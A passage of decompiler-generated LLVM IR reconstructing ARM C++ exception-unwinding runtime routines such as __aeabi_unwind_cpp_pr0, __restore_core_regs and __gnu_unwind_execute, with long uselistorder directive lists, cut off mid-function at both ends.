  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 5, 7, 6, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 0 }
  uselistorder i32* %r0.global-to-local, { 8, 1, 2, 3, 4, 5, 6, 7, 9, 10, 11, 13, 12, 14, 16, 15, 24, 17, 18, 19, 20, 21, 22, 23, 26, 25, 28, 27, 29, 30, 32, 31, 35, 33, 34, 0 }
  uselistorder i32* %fp.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 8, 7, 9 }
  uselistorder i32 6, { 74, 0, 14, 15, 73, 16, 30, 17, 31, 18, 32, 20, 21, 22, 19, 29, 2, 1, 4, 33, 34, 35, 5, 36, 37, 38, 39, 6, 40, 41, 42, 43, 7, 44, 8, 45, 46, 23, 47, 9, 48, 49, 50, 24, 51, 10, 52, 53, 54, 25, 55, 56, 57, 26, 58, 11, 59, 60, 61, 62, 27, 63, 12, 64, 65, 66, 67, 68, 69, 28, 70, 13, 71, 3, 72 }
  uselistorder i32 -3, { 4, 0, 5, 7, 6, 3, 1, 2 }
  uselistorder i32 52, { 23, 1, 2, 5, 12, 13, 9, 10, 11, 14, 16, 15, 6, 18, 19, 3, 20, 0, 21, 22, 7, 8, 17, 4 }
  uselistorder i32 48, { 17, 2, 0, 6, 4, 5, 9, 10, 7, 8, 14, 15, 16, 11, 12, 3, 13, 1 }
  uselistorder i32 44, { 40, 2, 41, 42, 0, 13, 3, 14, 4, 5, 6, 24, 25, 26, 27, 28, 29, 21, 22, 23, 7, 19, 20, 8, 1, 9, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 10, 11, 12, 15, 16, 17, 18 }
  uselistorder i32 -2147483648, { 3, 4, 5, 6, 7, 8, 9, 10, 0, 1, 2 }
  uselistorder i32 1073741824, { 4, 5, 6, 7, 8, 9, 10, 11, 0, 1, 2, 3 }
  uselistorder i32 65536, { 4, 5, 6, 7, 9, 8, 14, 10, 15, 11, 16, 12, 17, 13, 18, 19, 20, 24, 21, 25, 22, 26, 23, 27, 151, 28, 29, 30, 31, 32, 33, 150, 34, 35, 36, 38, 37, 40, 39, 41, 42, 2, 43, 0, 3, 44, 45, 47, 46, 1, 50, 48, 49, 51, 56, 52, 57, 53, 58, 54, 55, 59, 60, 61, 62, 64, 65, 63, 149, 67, 66, 70, 71, 72, 68, 69, 75, 73, 76, 74, 77, 78, 79, 80, 81, 84, 86, 82, 85, 83, 87, 89, 88, 92, 93, 94, 90, 91, 95, 96, 98, 99, 100, 97, 101, 102, 104, 103, 106, 105, 107, 108, 110, 109, 112, 111, 115, 117, 113, 116, 114, 118, 119, 126, 120, 127, 121, 128, 122, 129, 123, 130, 124, 125, 132, 131, 133, 134, 135, 136, 141, 137, 142, 138, 143, 139, 140, 145, 144, 146, 147, 148 }
  uselistorder i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_221d4.362 to i32), i32 100) to i32*), { 1, 0 }
  uselistorder i32 88, { 5, 6, 3, 0, 4, 1, 2 }
  uselistorder i32 100, { 0, 1, 3, 2, 4 }
  uselistorder i32 ptrtoint (i32* @global_var_221d4.362 to i32), { 28, 6, 29, 30, 7, 8, 64, 82, 83, 1, 2, 0, 3, 65, 66, 84, 9, 67, 85, 10, 11, 12, 13, 14, 27, 68, 86, 69, 87, 15, 16, 70, 71, 72, 88, 17, 89, 90, 91, 18, 92, 19, 73, 93, 94, 20, 21, 22, 95, 74, 96, 23, 97, 24, 98, 99, 100, 4, 26, 101, 75, 102, 77, 103, 25, 104, 105, 106, 34, 33, 35, 107, 108, 31, 59, 55, 53, 52, 54, 56, 57, 58, 51, 60, 46, 48, 47, 45, 44, 49, 50, 41, 40, 43, 42, 39, 38, 37, 36, 79, 61, 78, 62, 63, 80, 109, 5, 110, 111, 112, 113, 114, 32, 76, 115, 81 }
  uselistorder i32 -2, { 0, 30, 31, 6, 3, 4, 2, 7, 8, 9, 1, 5, 10, 26, 25, 27, 28, 29, 18, 19, 20, 21, 22, 23, 24, 11, 12, 13, 14, 15, 16, 17 }
  uselistorder i32 80, { 10, 11, 12, 0, 2, 1, 3, 4, 5, 8, 6, 7, 9 }
  uselistorder i32 %ucbp, { 0, 1, 3, 2 }
  uselistorder i32 %state, { 1, 0, 2 }
  uselistorder label %dec_label_pc_190e8, { 1, 0, 2, 3 }
  uselistorder label %bb166, { 2, 1, 3, 0 }
  uselistorder label %dec_label_pc_19004, { 1, 0 }
  uselistorder label %dec_label_pc_18fcc, { 2, 1, 3, 0 }
  uselistorder label %dec_label_pc_18f90, { 1, 2, 3, 0, 4 }
  uselistorder label %bb163, { 1, 0 }
  uselistorder label %dec_label_pc_18f0c, { 1, 0 }
  uselistorder label %bb161, { 1, 0 }
  uselistorder label %dec_label_pc_18e4c, { 1, 2, 3, 5, 4, 0 }
  uselistorder label %dec_label_pc_18e48, { 3, 1, 0, 2 }
  uselistorder label %dec_label_pc_18da8, { 1, 0 }
  uselistorder label %bb154, { 2, 0, 1 }
  uselistorder label %bb152, { 1, 0 }
  uselistorder label %dec_label_pc_18d04, { 1, 0 }
  uselistorder label %dec_label_pc_18d04.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_18d04.preheader.lr.ph, { 1, 0 }
  uselistorder label %bb148, { 1, 0 }
}

define i32 @function_191a4(i32 %arg1) local_unnamed_addr {
dec_label_pc_191a4:
  %v0_191a4 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_191a4, label %bb, label %.thread1

bb:                                               ; preds = %dec_label_pc_191a4
  br label %.thread1

.thread1:                                         ; preds = %dec_label_pc_191a4, %bb
  %v10_191ac = phi i32 [ %arg1, %dec_label_pc_191a4 ], [ 0, %bb ]
  ret i32 %v10_191ac

; uselistorder directives
  uselistorder i1 false, { 0, 1, 2, 3, 30, 31, 32, 49, 24, 29, 50, 51, 52, 53, 54, 5, 4, 55, 45, 46, 33, 34, 25, 37, 36, 35, 38, 8, 10, 9, 22, 48, 47, 26, 21, 41, 14, 42, 23, 13, 12, 11, 15, 16, 17, 39, 27, 28, 7, 6, 18, 19, 20, 44, 40, 43, 56, 57 }
  uselistorder i1* @cpsr_z, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 41, 14, 15, 16, 37, 38, 39, 40, 0, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 35, 36, 33, 34 }
  uselistorder label %.thread1, { 1, 0 }
}

define i32 @__aeabi_unwind_cpp_pr2(i32 %state, i32 %ucbp, i32 %context) local_unnamed_addr {
entry:
  %v1_191b4 = load i32, i32* @r1, align 4
  %v2_191b4 = load i32, i32* @r2, align 4
  %v4_191b4 = call i32 @__gnu_unwind_pr_common(i32 2, i32 %v1_191b4, i32 %v2_191b4, i32 2)
  ret i32 %v4_191b4
}

define i32 @__aeabi_unwind_cpp_pr1(i32 %state, i32 %ucbp, i32 %context) local_unnamed_addr {
entry:
  %v1_191bc = load i32, i32* @r1, align 4
  %v2_191bc = load i32, i32* @r2, align 4
  %v4_191bc = call i32 @__gnu_unwind_pr_common(i32 1, i32 %v1_191bc, i32 %v2_191bc, i32 1)
  ret i32 %v4_191bc
}

define i32 @__aeabi_unwind_cpp_pr0(i32 %state, i32 %ucbp, i32 %context) local_unnamed_addr {
entry:
  %v1_191c4 = load i32, i32* @r1, align 4
  %v2_191c4 = load i32, i32* @r2, align 4
  %v4_191c4 = call i32 @__gnu_unwind_pr_common(i32 0, i32 %v1_191c4, i32 %v2_191c4, i32 0)
  ret i32 %v4_191c4

; uselistorder directives
  uselistorder i32 (i32, i32, i32, i32)* @__gnu_unwind_pr_common, { 2, 1, 0 }
  uselistorder i32* @r2, { 10, 12, 11, 61, 13, 0, 22, 14, 23, 62, 63, 64, 18, 19, 20, 21, 43, 44, 45, 46, 65, 66, 67, 81, 82, 83, 84, 1, 70, 71, 2, 72, 73, 3, 74, 68, 69, 37, 38, 4, 5, 6, 59, 60, 7, 8, 47, 48, 49, 75, 76, 77, 78, 79, 80, 39, 40, 41, 50, 51, 52, 54, 26, 15, 16, 17, 29, 30, 27, 28, 24, 25, 31, 32, 33, 34, 35, 36, 42, 9, 53, 55, 56, 57, 58 }
}

define i32 @__restore_core_regs(i32* %arg1) local_unnamed_addr {
entry:
  %tmp = ptrtoint i32* %arg1 to i32
  %v3_191cc = add i32 %tmp, 56
  %v4_191cc = inttoptr i32 %v3_191cc to i32*
  %v5_191cc = load i32, i32* %v4_191cc, align 4
  %v6_191cc = add i32 %tmp, 60
  %v7_191cc = inttoptr i32 %v6_191cc to i32*
  %v8_191cc = load i32, i32* %v7_191cc, align 4
  %v2_191d8 = load i32, i32* %arg1, align 4
  %v3_191d8 = add i32 %tmp, 4
  %v4_191d8 = inttoptr i32 %v3_191d8 to i32*
  %v5_191d8 = load i32, i32* %v4_191d8, align 4
  store i32 %v5_191d8, i32* @r1, align 4
  %v12_191d8 = add i32 %tmp, 16
  %v13_191d8 = inttoptr i32 %v12_191d8 to i32*
  %v14_191d8 = load i32, i32* %v13_191d8, align 4
  store i32 %v14_191d8, i32* @r4, align 4
  %v15_191d8 = add i32 %tmp, 20
  %v16_191d8 = inttoptr i32 %v15_191d8 to i32*
  %v17_191d8 = load i32, i32* %v16_191d8, align 4
  store i32 %v17_191d8, i32* @r5, align 4
  %v18_191d8 = add i32 %tmp, 24
  %v19_191d8 = inttoptr i32 %v18_191d8 to i32*
  %v20_191d8 = load i32, i32* %v19_191d8, align 4
  store i32 %v20_191d8, i32* @r6, align 4
  %v21_191d8 = add i32 %tmp, 28
  %v22_191d8 = inttoptr i32 %v21_191d8 to i32*
  %v23_191d8 = load i32, i32* %v22_191d8, align 4
  store i32 %v23_191d8, i32* @r7, align 4
  %v24_191d8 = add i32 %tmp, 32
  %v25_191d8 = inttoptr i32 %v24_191d8 to i32*
  %v26_191d8 = load i32, i32* %v25_191d8, align 4
  store i32 %v26_191d8, i32* @r8, align 4
  %v27_191d8 = add i32 %tmp, 36
  %v28_191d8 = inttoptr i32 %v27_191d8 to i32*
  %v29_191d8 = load i32, i32* %v28_191d8, align 4
  store i32 %v29_191d8, i32* @sb, align 4
  %v30_191d8 = add i32 %tmp, 40
  %v31_191d8 = inttoptr i32 %v30_191d8 to i32*
  %v32_191d8 = load i32, i32* %v31_191d8, align 4
  store i32 %v32_191d8, i32* @sl, align 4
  store i32 %v8_191cc, i32* @ip, align 4
  store i32 %v5_191cc, i32* @lr, align 4
  call void @__pseudo_branch(i32 %v8_191cc)
  ret i32 %v2_191d8

; uselistorder directives
  uselistorder i32 %v8_191cc, { 1, 0 }
  uselistorder i32 %tmp, { 7, 6, 5, 4, 3, 2, 1, 0, 9, 8 }
  uselistorder i32* @ip, { 37, 38, 39, 40, 13, 14, 5, 0, 43, 6, 7, 41, 42, 11, 12, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 1, 77, 78, 79, 80, 81, 82, 83, 84, 85, 8, 86, 87, 29, 30, 2, 31, 32, 33, 34, 35, 36, 27, 17, 28, 9, 20, 10, 15, 16, 21, 22, 23, 24, 25, 26, 3, 18, 19, 4 }
  uselistorder i32 40, { 32, 28, 29, 30, 31, 11, 33, 3, 12, 7, 8, 4, 14, 2, 9, 6, 13, 15, 10, 16, 17, 18, 5, 19, 20, 0, 21, 23, 22, 24, 1, 25, 27, 26 }
  uselistorder i32* @sb, { 116, 117, 118, 6, 7, 8, 9, 98, 99, 100, 101, 102, 103, 104, 105, 106, 109, 107, 108, 110, 90, 91, 73, 74, 17, 18, 19, 20, 21, 22, 23, 24, 1, 2, 3, 4, 5, 29, 30, 25, 26, 27, 28, 10, 11, 12, 13, 14, 15, 16, 31, 0, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 92, 93, 94, 95, 96, 97, 111, 112, 113, 114, 115 }
  uselistorder i32 36, { 21, 20, 4, 22, 6, 7, 5, 16, 19, 8, 17, 9, 0, 1, 2, 3, 10, 11, 18, 12, 13, 14, 15 }
  uselistorder i32* @r8, { 281, 263, 264, 265, 266, 267, 268, 269, 270, 271, 272, 273, 274, 275, 276, 277, 278, 279, 2, 280, 0, 46, 282, 13, 283, 47, 48, 49, 50, 33, 34, 35, 36, 37, 38, 39, 40, 41, 4, 42, 43, 44, 45, 51, 52, 53, 54, 14, 284, 15, 30, 31, 5, 32, 216, 217, 6, 218, 219, 220, 244, 245, 246, 247, 248, 11, 249, 250, 251, 252, 253, 254, 255, 256, 203, 204, 205, 206, 188, 189, 190, 191, 192, 167, 168, 169, 170, 60, 61, 62, 63, 16, 17, 104, 105, 106, 107, 108, 64, 65, 66, 67, 109, 110, 111, 112, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 18, 29, 78, 79, 80, 81, 7, 55, 1, 56, 57, 58, 12, 59, 82, 83, 84, 85, 86, 87, 88, 89, 90, 91, 92, 93, 97, 94, 95, 96, 100, 98, 99, 10, 101, 102, 103, 113, 114, 115, 116, 117, 118, 119, 120, 121, 122, 8, 123, 124, 125, 126, 127, 128, 129, 130, 131, 132, 133, 134, 135, 136, 137, 138, 139, 140, 141, 142, 143, 144, 145, 146, 147, 148, 149, 150, 151, 152, 153, 154, 155, 156, 157, 158, 159, 160, 161, 162, 163, 164, 165, 166, 171, 172, 173, 174, 175, 176, 177, 178, 179, 180, 181, 182, 183, 184, 185, 186, 187, 193, 194, 195, 196, 197, 198, 9, 199, 200, 201, 202, 207, 208, 3, 209, 210, 211, 212, 213, 214, 215, 221, 222, 223, 224, 225, 226, 227, 228, 229, 230, 231, 232, 233, 234, 235, 236, 237, 238, 239, 240, 241, 242, 243, 257, 258, 259, 260, 261, 262 }
  uselistorder i32 32, { 94, 91, 92, 93, 52, 95, 96, 48, 63, 97, 47, 88, 53, 49, 73, 71, 72, 68, 69, 70, 80, 81, 74, 75, 65, 66, 67, 78, 79, 54, 86, 87, 89, 2, 3, 5, 4, 90, 7, 6, 9, 8, 11, 10, 12, 50, 55, 51, 82, 56, 14, 13, 60, 57, 58, 59, 16, 15, 18, 17, 20, 19, 64, 22, 21, 24, 23, 25, 27, 26, 29, 28, 30, 31, 33, 32, 76, 77, 83, 34, 84, 35, 85, 36, 37, 38, 39, 61, 40, 41, 42, 62, 43, 0, 44, 1, 45, 46 }
  uselistorder i32 28, { 45, 10, 28, 46, 25, 47, 48, 49, 50, 7, 29, 30, 26, 27, 34, 11, 31, 12, 42, 43, 44, 8, 13, 0, 18, 1, 19, 2, 20, 3, 21, 4, 22, 5, 23, 6, 24, 9, 17, 33, 32, 14, 15, 16, 35, 36, 37, 38, 39, 40, 41 }
  uselistorder i32 24, { 96, 95, 97, 8, 9, 98, 0, 58, 59, 60, 61, 62, 63, 56, 57, 10, 64, 65, 75, 76, 66, 67, 7, 11, 94, 89, 90, 91, 1, 77, 78, 79, 38, 39, 12, 68, 69, 70, 49, 40, 41, 42, 43, 44, 45, 46, 47, 48, 50, 51, 52, 53, 54, 55, 71, 72, 73, 74, 13, 14, 15, 16, 17, 18, 19, 20, 21, 80, 22, 23, 2, 24, 25, 26, 3, 27, 28, 4, 29, 30, 81, 31, 5, 82, 32, 83, 84, 85, 86, 33, 34, 6, 87, 35, 88, 36, 92, 37, 93 }
  uselistorder i32 20, { 127, 125, 126, 128, 1, 4, 8, 35, 129, 31, 130, 131, 132, 133, 5, 134, 135, 2, 136, 36, 9, 32, 33, 34, 37, 38, 39, 49, 50, 40, 41, 137, 118, 119, 120, 121, 122, 123, 124, 10, 114, 115, 116, 3, 51, 11, 52, 53, 0, 30, 43, 12, 45, 13, 46, 29, 44, 42, 47, 48, 14, 15, 16, 17, 54, 18, 55, 56, 57, 58, 59, 60, 19, 61, 62, 63, 64, 65, 66, 20, 67, 68, 69, 70, 71, 72, 73, 74, 75, 21, 76, 77, 78, 79, 80, 81, 82, 83, 22, 84, 85, 86, 87, 88, 89, 23, 90, 91, 24, 92, 93, 94, 95, 25, 96, 97, 26, 98, 99, 100, 101, 102, 103, 104, 6, 105, 27, 106, 107, 108, 109, 7, 110, 28, 111, 112, 113, 117 }
  uselistorder i32* @r1, { 190, 20, 22, 21, 4, 191, 192, 67, 68, 84, 47, 2, 194, 48, 193, 173, 49, 50, 51, 23, 69, 1, 70, 71, 24, 197, 25, 5, 198, 199, 200, 201, 202, 203, 204, 205, 206, 207, 208, 209, 210, 211, 212, 213, 214, 6, 215, 216, 72, 74, 75, 76, 77, 78, 79, 80, 81, 82, 73, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 66, 65, 3, 83, 26, 180, 121, 122, 217, 27, 219, 220, 221, 222, 133, 134, 33, 95, 34, 218, 28, 35, 181, 182, 183, 184, 185, 186, 187, 188, 189, 46, 113, 114, 175, 7, 171, 172, 8, 176, 179, 177, 9, 178, 96, 97, 29, 160, 155, 98, 161, 174, 135, 136, 14, 36, 37, 38, 39, 40, 41, 42, 10, 225, 226, 227, 228, 0, 229, 32, 85, 123, 156, 99, 223, 224, 195, 196, 30, 15, 100, 124, 125, 126, 127, 128, 31, 137, 138, 101, 102, 43, 44, 45, 103, 104, 105, 107, 108, 106, 86, 87, 89, 91, 88, 16, 90, 17, 92, 93, 94, 164, 165, 166, 11, 12, 139, 109, 110, 111, 112, 115, 116, 117, 18, 118, 119, 120, 129, 130, 131, 19, 132, 167, 168, 13, 140, 141, 142, 143, 144, 145, 146, 147, 148, 149, 150, 151, 152, 153, 154, 157, 158, 159, 162, 163, 169, 170 }
  uselistorder i32 60, { 3, 22, 23, 24, 4, 5, 1, 6, 15, 16, 17, 18, 19, 20, 7, 11, 12, 8, 13, 14, 9, 10, 0, 2, 21 }
  uselistorder i32 56, { 4, 32, 33, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 10, 9, 3, 11, 12, 13, 14, 15, 29, 30, 26, 27, 5, 6, 2, 7, 1, 8, 28, 0, 31 }
}

define i32 @__gnu_Unwind_Restore_VFP(i32 %arg1) local_unnamed_addr {
entry:
  %v1_191e8 = load i32, i32* @r0, align 4
  ret i32 %v1_191e8
}

define i32 @__gnu_Unwind_Save_VFP(i32 %arg1) local_unnamed_addr {
entry:
  %v1_191f0 = load i32, i32* @r0, align 4
  ret i32 %v1_191f0
}

define i32 @___Unwind_RaiseException(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-68 = alloca i32, align 4
  store i32 0, i32* %stack_var_-68, align 4
  %v2_19204 = ptrtoint i32* %stack_var_-68 to i32
  %v2_19208 = call i32 @__gnu_Unwind_RaiseException(i32 %v2_19204, i32 0)
  ret i32 %v2_19208

; uselistorder directives
  uselistorder i32* %stack_var_-68, { 1, 0 }
}

define i32 @___Unwind_Resume(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-68 = alloca i32, align 4
  store i32 0, i32* %stack_var_-68, align 4
  %v2_19228 = ptrtoint i32* %stack_var_-68 to i32
  %v2_1922c = call i32 @__gnu_Unwind_Resume(i32 %v2_19228, i32 0)
  ret i32 %v2_1922c

; uselistorder directives
  uselistorder i32* %stack_var_-68, { 1, 0 }
}

define i32 @_Unwind_Resume_or_Rethrow(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-68 = alloca i32, align 4
  store i32 0, i32* %stack_var_-68, align 4
  %v2_1924c = ptrtoint i32* %stack_var_-68 to i32
  %v2_19250 = call i32 @__gnu_Unwind_Resume_or_Rethrow(i32 %v2_1924c, i32 0)
  ret i32 %v2_19250

; uselistorder directives
  uselistorder i32* %stack_var_-68, { 1, 0 }
}

define i32 @___Unwind_ForcedUnwind(i32 %arg1, i32 %arg2, i8* %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-68 = alloca i32, align 4
  store i32 0, i32* %stack_var_-68, align 4
  %v2_19270 = ptrtoint i32* %stack_var_-68 to i32
  %v6_19274 = call i32 @__gnu_Unwind_ForcedUnwind(i32 %v2_19270, i32 %arg2, i8* %arg3, i32 %v2_19270)
  ret i32 %v6_19274

; uselistorder directives
  uselistorder i32* %stack_var_-68, { 1, 0 }
}

define i8* @_Unwind_GetLanguageSpecificData(i32 %context) local_unnamed_addr {
entry:
  %tmp1 = call i32 @__decompiler_undefined_function_0()
  %v5_192a0 = call i32 @_Unwind_VRS_Get(i32 12, i32 0, i32 12, i32 0, i8* bitcast (i32* @0 to i8*))
  %v1_192a8 = add i32 %tmp1, 76
  %v2_192a8 = inttoptr i32 %v1_192a8 to i32*
  %v3_192a8 = load i32, i32* %v2_192a8, align 4
  %v1_192ac = add i32 %v3_192a8, 7
  %v2_192ac = inttoptr i32 %v1_192ac to i8*
  %v3_192ac = load i8, i8* %v2_192ac, align 1
  %v4_192ac = zext i8 %v3_192ac to i32
  %v1_192b0 = add i32 %v3_192a8, 8
  %v3_192b4 = mul nuw nsw i32 %v4_192ac, 4
  %v2_192b8 = add i32 %v3_192b4, %v1_192b0
  %v3_192b8 = inttoptr i32 %v2_192b8 to i8*
  ret i8* %v3_192b8
}

define i32 @__gnu_unwind_execute(i32 %context, %anon_struct_13* %uws) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %ip.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %tmp = ptrtoint %anon_struct_13* %uws to i32
  store i32 %tmp, i32* %r1.global-to-local, align 4
  store i32 %context, i32* %r0.global-to-local, align 4
  %stack_var_-36 = alloca i32, align 4
  %v9_192c8 = load i32, i32* @r6, align 4
  %v21_192c8 = load i32, i32* @lr, align 4
  %v0_192cc = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_192cc, i32* @r7, align 4
  store i32 %tmp, i32* @r5, align 4
  store i32 0, i32* @sl, align 4
  %tmp146 = bitcast i32* %stack_var_-36 to i8*
  br label %dec_label_pc_192dc

dec_label_pc_192dc:                               ; preds = %dec_label_pc_192dc.backedge, %entry
  %v3_192e8 = phi i32 [ %v0_192dc.pre, %dec_label_pc_192dc.backedge ], [ %tmp, %entry ]
  %v1_192dc = add i32 %v3_192e8, 8
  %v2_192dc = inttoptr i32 %v1_192dc to i8*
  %v3_192dc = load i8, i8* %v2_192dc, align 1
  %v4_192dc = zext i8 %v3_192dc to i32
  store i32 %v4_192dc, i32* %r3.global-to-local, align 4
  %v2_192e0 = icmp eq i8 %v3_192dc, 0
  store i1 %v2_192e0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_192e0, label %dec_label_pc_192f0, label %.thread

.thread:                                          ; preds = %dec_label_pc_192dc
  %v2_192e4 = add nsw i32 %v4_192dc, -1
  store i32 %v2_192e4, i32* %r3.global-to-local, align 4
  %v2_192e8 = trunc i32 %v2_192e4 to i8
  store i8 %v2_192e8, i8* %v2_192dc, align 1
  %v0_192ec.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_192ec.pr.pr, label %.thread.dec_label_pc_192f0_crit_edge, label %dec_label_pc_19318

.thread.dec_label_pc_192f0_crit_edge:             ; preds = %.thread
  %v0_192f0.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_192f0

dec_label_pc_192f0:                               ; preds = %.thread.dec_label_pc_192f0_crit_edge, %dec_label_pc_192dc
  %v0_192f0 = phi i32 [ %v0_192f0.pre, %.thread.dec_label_pc_192f0_crit_edge ], [ %v3_192e8, %dec_label_pc_192dc ]
  %v1_192f0 = add i32 %v0_192f0, 9
  %v2_192f0 = inttoptr i32 %v1_192f0 to i8*
  %v3_192f0 = load i8, i8* %v2_192f0, align 1
  %v4_192f0 = zext i8 %v3_192f0 to i32
  store i32 %v4_192f0, i32* %r3.global-to-local, align 4
  %v2_192f4 = icmp eq i8 %v3_192f0, 0
  store i1 %v2_192f4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_192f4, label %dec_label_pc_193f8, label %dec_label_pc_192fc

dec_label_pc_192fc:                               ; preds = %dec_label_pc_193ec, %dec_label_pc_192f0
  %v2_19300 = phi i32 [ %v0_193ec, %dec_label_pc_193ec ], [ %v0_192f0, %dec_label_pc_192f0 ]
  %v0_192fc = phi i32 [ %v4_193ec, %dec_label_pc_193ec ], [ %v4_192f0, %dec_label_pc_192f0 ]
  %v1_192fc = add nsw i32 %v0_192fc, -1
  store i32 %v1_192fc, i32* %r3.global-to-local, align 4
  %v1_19300 = trunc i32 %v1_192fc to i8
  %v3_19300 = add i32 %v2_19300, 9
  %v4_19300 = inttoptr i32 %v3_19300 to i8*
  store i8 %v1_19300, i8* %v4_19300, align 1
  %v0_19304 = load i32, i32* @r5, align 4
  %v1_19304 = add i32 %v0_19304, 4
  %v2_19304 = inttoptr i32 %v1_19304 to i32*
  %v3_19304 = load i32, i32* %v2_19304, align 4
  store i32 %v3_19304, i32* %r2.global-to-local, align 4
  %v1_19308 = inttoptr i32 %v3_19304 to i32*
  %v2_19308 = load i32, i32* %v1_19308, align 4
  store i32 %v2_19308, i32* %r0.global-to-local, align 4
  %v4_19308 = add i32 %v3_19304, 4
  store i32 %v4_19308, i32* %r2.global-to-local, align 4
  store i32 3, i32* %r3.global-to-local, align 4
  %v1_19310 = inttoptr i32 %v0_19304 to i32*
  store i32 %v2_19308, i32* %v1_19310, align 4
  %v5_19310 = load i32, i32* %r2.global-to-local, align 4
  store i32 %v5_19310, i32* %v2_19304, align 4
  %v0_19314 = load i32, i32* %r3.global-to-local, align 4
  %v1_19314 = trunc i32 %v0_19314 to i8
  %v2_19314 = load i32, i32* @r5, align 4
  %v3_19314 = add i32 %v2_19314, 8
  %v4_19314 = inttoptr i32 %v3_19314 to i8*
  store i8 %v1_19314, i8* %v4_19314, align 1
  br label %dec_label_pc_19318

dec_label_pc_19318:                               ; preds = %.thread, %dec_label_pc_192fc, %.thread6
  %v0_19318 = load i32, i32* @r5, align 4
  %v1_19318 = inttoptr i32 %v0_19318 to i32*
  %v2_19318 = load i32, i32* %v1_19318, align 4
  %v3_1931c = udiv i32 %v2_19318, 16777216
  store i32 %v3_1931c, i32* @r4, align 4
  store i32 %v3_1931c, i32* %ip.global-to-local, align 4
  %v3_19324 = mul i32 %v2_19318, 256
  store i32 %v3_19324, i32* %r0.global-to-local, align 4
  %tmp182 = and i32 %v2_19318, -16777216
  %tmp183 = icmp eq i32 %tmp182, -1342177280
  store i1 %tmp183, i1* %cpsr_z.global-to-local, align 1
  store i32 %v3_19324, i32* %v1_19318, align 4
  br i1 %tmp183, label %dec_label_pc_193f8, label %dec_label_pc_19334

dec_label_pc_19334:                               ; preds = %dec_label_pc_19318
  %v0_19334 = load i32, i32* @r4, align 4
  %v1_19334 = and i32 %v0_19334, 128
  store i32 %v1_19334, i32* %r1.global-to-local, align 4
  %v2_19334 = icmp eq i32 %v1_19334, 0
  store i1 %v2_19334, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_19334, label %dec_label_pc_19410, label %dec_label_pc_1933c

dec_label_pc_1933c:                               ; preds = %dec_label_pc_19334
  %v1_1933c = and i32 %v0_19334, 240
  store i32 %v1_1933c, i32* @r6, align 4
  %v7_19340 = icmp eq i32 %v1_1933c, 128
  store i1 %v7_19340, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_19340, label %dec_label_pc_19348, label %dec_label_pc_1946c

dec_label_pc_19348:                               ; preds = %dec_label_pc_1933c
  %v0_19348 = load i32, i32* @r5, align 4
  %v1_19348 = add i32 %v0_19348, 8
  %v2_19348 = inttoptr i32 %v1_19348 to i8*
  %v3_19348 = load i8, i8* %v2_19348, align 1
  %v4_19348 = zext i8 %v3_19348 to i32
  store i32 %v4_19348, i32* %r3.global-to-local, align 4
  %v2_1934c = icmp eq i8 %v3_19348, 0
  store i1 %v2_1934c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1934c, label %dec_label_pc_1935c, label %.thread3

.thread3:                                         ; preds = %dec_label_pc_19348
  %v2_19350 = add nsw i32 %v4_19348, -1
  store i32 %v2_19350, i32* %r3.global-to-local, align 4
  %v2_19354 = trunc i32 %v2_19350 to i8
  store i8 %v2_19354, i8* %v2_19348, align 1
  %v0_19358.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_19358.pr.pr, label %.thread3.dec_label_pc_1935c_crit_edge, label %dec_label_pc_1938c

.thread3.dec_label_pc_1935c_crit_edge:            ; preds = %.thread3
  %v0_1935c.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_1935c

dec_label_pc_1935c:                               ; preds = %.thread3.dec_label_pc_1935c_crit_edge, %dec_label_pc_19348
  %v2_19370 = phi i32 [ %v0_1935c.pre, %.thread3.dec_label_pc_1935c_crit_edge ], [ %v0_19348, %dec_label_pc_19348 ]
  %v1_1935c = add i32 %v2_19370, 9
  %v2_1935c = inttoptr i32 %v1_1935c to i8*
  %v3_1935c = load i8, i8* %v2_1935c, align 1
  %v4_1935c = zext i8 %v3_1935c to i32
  store i32 %v4_1935c, i32* %r3.global-to-local, align 4
  %v2_19360 = icmp eq i8 %v3_1935c, 0
